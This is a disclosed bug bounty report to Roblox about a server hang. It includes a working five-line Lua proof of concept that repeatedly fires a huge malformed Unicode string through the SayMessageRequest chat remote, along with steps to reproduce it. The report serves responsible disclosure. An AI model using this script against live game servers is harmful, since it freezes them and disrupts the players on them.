# Malformed string sent through FireServer leads to server freezing/hanging

## Report Details
- **Report ID**: 679907
- **URL**: https://hackerone.com/reports/679907
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-08-22T18:24:54.435Z
- **Disclosed**: 2020-04-29T22:14:07.805Z

## Reporter
- **Username**: teeth
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: roblox

## Vulnerability Information
This was found an hour ago so if I get any information wrong, please comment and I'll get back to you!

A cheater/exploiter can hang any Roblox gameserver due to a 5 line script which sends a big malformed string through SayMessageRequest resulting in the server to hang itself. This works in any game that has the "SayMessageRequest" remote and can be done easily, especially if the attacker has some sort of "script execution" exploit on their hands.

To reproduce this exploit:
Go into Roblox Client/Studio
Execute this into the cmdbar
```
local malformed = string.rep("ก็็็▌▓", math.random(10000, 2e5))
local remote = game:GetService'ReplicatedStorage'.DefaultChatSystemChatEvents:WaitForChild'SayMessageRequest'
while wait() do
	remote:FireServer(malformed, malformed)
end
```
Watch the server hang itself (try walking around).

Note: If done on Studio while playing solo, it seems to hang the entire program. Luckily I found a workaround to this by testing it in a local server with 2-3 players and then executing it on any of the player instances.

I've attached a PoC video.

## Impact

Hang/Freeze any game servers which isn't intended.

## Attachments
- freeze.mp4
